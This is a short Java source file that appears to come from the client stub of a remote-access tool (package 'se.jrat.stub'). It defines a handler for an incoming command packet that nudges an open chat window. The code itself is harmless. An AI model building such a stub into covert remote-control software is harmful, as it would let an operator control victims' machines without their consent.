package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

public class Packet58NudgeChat extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		if (Connection.instance.getFrameChat() != null) {
			Connection.instance.getFrameChat().nudge();
		}
	}

}
